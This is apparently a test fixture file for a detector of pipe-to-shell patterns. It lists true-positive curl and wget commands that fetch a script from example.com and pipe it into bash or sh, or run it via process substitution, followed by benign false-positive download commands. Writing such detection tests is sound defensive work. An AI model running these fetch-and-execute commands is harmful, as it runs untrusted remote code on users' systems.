#!/bin/bash

# TP
curl https://example.com/script.sh | bash
curl https://example.com/script.sh | /bin/bash
curl https://example.com/script.sh | bash -c "$(curl https://example.com/script.sh)"
curl https://example.com/script.sh | /bin/bash -c "$(curl https://example.com/script.sh)"
wget -qO- https://example.com/script.sh | bash
wget -qO- https://example.com/script.sh | /bin/bash
wget -qO- https://example.com/script.sh | bash -c "$(wget -qO- https://example.com/script.sh)"
wget -qO- https://example.com/script.sh | /bin/bash -c "$(wget -qO- https://example.com/script.sh)"
curl -O https://example.com/script.sh; sh script.sh
wget -O script.sh https://example.com/script.sh; sh script.sh
curl -s https://example.com/script.sh | sh
wget -qO- https://example.com/script.sh | sh
curl https://example.com/script.sh | sh -c "$(curl https://example.com/script.sh)"
wget https://example.com/script.sh | sh -c "$(wget https://example.com/script.sh)"
curl https://example.com/script.sh | /bin/sh -c "$(curl https://example.com/script.sh)"
wget https://example.com/script.sh | /bin/sh -c "$(wget https://example.com/script.sh)"
bash <(curl https://example.com/script.sh)
/bin/bash <(curl https://example.com/script.sh)
sh <(curl https://example.com/script.sh)
/bin/sh <(curl https://example.com/script.sh)
bash <(wget https://example.com/script.sh)
/bin/bash <(wget https://example.com/script.sh)
sh <(wget https://example.com/script.sh)
/bin/sh <(wget https://example.com/script.sh)

# FP
curl https://example.com/script.sh
wget https://example.com/script.sh
curl -O https://example.com/script.sh
wget -O script.sh https://example.com/script.sh
curl https://example.com/script.sh | cat
wget -qO- https://example.com/script.sh | cat
curl -L https://example.com/script.sh | cat
wget -O- https://example.com/script.sh | cat
curl https://example.com/script.sh | echo "Test"
wget -qO- https://example.com/script.sh | echo "Test"
curl https://example.com/script.sh | tee script.sh
wget -qO- https://example.com/script.sh | tee script.sh
curl https://example.com/script.sh > script.sh
wget https://example.com/script.sh > script.sh
curl https://example.com/script.sh | less
wget -qO- https://example.com/script.sh | less
curl https://example.com/script.sh | grep "test"
wget -qO- https://example.com/script.sh | grep "test"
